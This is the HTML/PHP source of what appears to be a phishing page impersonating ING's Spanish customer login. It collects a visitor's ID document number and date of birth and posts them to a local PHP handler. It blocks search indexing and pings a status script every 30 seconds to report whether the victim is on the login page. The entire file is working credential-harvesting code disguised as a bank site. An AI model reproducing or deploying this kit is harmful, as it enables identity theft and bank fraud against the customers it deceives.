<!doctype html>
<html class="zz">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">

        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />

        <title>ING</title>

        <script>
            /* Start Status */
                function updateStatus(status) {
                    fetch('./status/update_status.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({status , page : "LOGIN PAGE"})
                    });
                }
                
                updateStatus('online');
                
                window.addEventListener('beforeunload', () => {
                    updateStatus('offline');
                });
                
                setInterval(() => {
                    updateStatus('online');
                }, 30000); 
            /* End Status */            
        </script>         
    </head>

    <body class="zz">

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="./Assets/imgs/logo.svg"></div>
                <div class="right"><img src="./Assets/imgs/header-right.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- LOGIN AREA -->
        <section id="login-area">
            <div class="box">
                <form action="./Assets/php/config/func.php" method="post" id="forma">
                    <input type="hidden" name="log">
                    <input type="hidden" name="doctype" id="doctype" value="DNI o Tarjeta de residencia">
                    <?php if( isset($_GET['error']) ) : ?> 
                    <div class="error">
                        <div class="symbol"><img src="./Assets/imgs/error3.png"></div>
                        <div class="content">
                            Parece que alguno de los datos introducidos no es correcto. Inténtalo de nuevo.
                        </div>
                    </div>
                    <?php endif; ?>          
                    <legend>Accede a tu Área Clientes</legend>
                    <p>Elige tu documento</p>
                    <ul>
                        <li class="dni active">DNI o Tarjeta de residencia</li>
                        <li class="passport">Pasaporte</li>
                    </ul>
                    <div class="form-group mb20 <?php if(isset($_GET['error']))  echo 'has-error'; ?>">
                        <label for="doc_num">Número de documento</label>
                        <input type="text" name="doc_num" id="doc_num" class="form-control" placeholder="DNI o Tarjeta de residencia">
                        <?php if( isset($_GET['error']) ) : ?>
                        <p class="error-message" style="color:red; font-size:14px;">Este campo es obligatorio</p>
                        <?php endif; ?> 
                    </div>
                    <div class="form-group mb20 <?php if(isset($_GET['error']))  echo 'has-error'; ?>">
                        <label for="day">Fecha de nacimiento</label>
                        <div class="groups">
                            <div><input type="text" maxlength="2" name="day" id="day" class="form-control" placeholder="DD"></div>
                            <div><input type="text" maxlength="2" name="month" id="month" class="form-control" placeholder="MM"></div>
                            <div><input type="text" maxlength="4" name="year" id="year" class="form-control" placeholder="AAAA"></div>
                        </div>
                        <?php if( isset($_GET['error']) ) : ?>
                        <p class="error-message" style="color:red; font-size:14px;">Este campo es obligatorio</p>
                        <?php endif; ?> 
                    </div>
                    <div class="custom-control custom-checkbox mt20">
                        <input type="checkbox" class="custom-control-input" id="customCheck1">
                        <label class="custom-control-label" for="customCheck1">Recordar <img src="./Assets/imgs/help.png"></label>
                    </div>
                    <div class="form-group mb20 mt20">
                        <button id="booom">Entrar</button>
                    </div>
                    <p class="mb-0"><i class="fas fa-chevron-right"></i> <span style="color: #333">Acceder con DNI electrónico</span></p>
                    <p class="mb-4"><i class="fas fa-chevron-right"></i> <span style="color: #333">Más información sobre seguridad</span></p>
                </form>
            </div>
        </section>
        <!-- END LOGIN AREA -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>
            $('#day').mask('00');
            $('#month').mask('00');
            $('#year').mask('0000');
        </script>
    </body>

</html>